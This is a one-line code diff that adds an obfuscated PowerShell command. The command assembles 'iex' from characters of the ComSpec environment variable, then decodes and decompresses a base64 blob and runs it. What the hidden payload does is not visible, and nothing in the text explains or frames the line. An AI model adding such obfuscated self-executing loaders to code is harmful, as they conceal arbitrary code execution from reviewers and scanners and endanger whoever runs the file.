@@ -1,0 +1,1 @@
+&( $EnV:cOmSPec[4,15,25]-joIN'')( NeW-obJECT iO.STreaMREADER(( NeW-obJECT  IO.compreSSION.DeFlaTesTreAM([system.io.MemORySTReaM] [systeM.cOnVERt]::frOMBaSE64stRING('y0tOLNFLrUhVMLQ00jM0s9AzMjbQA7IVTExMFHRTFQryy1OLijNSc3JAqgA='),[sYsTEm.Io.COMPRessiON.CoMPRESSIONMode]::DECoMPreSS) ), [sYsTEm.tExT.enCoDiNg]::ASCii)).reaDtOEND( )
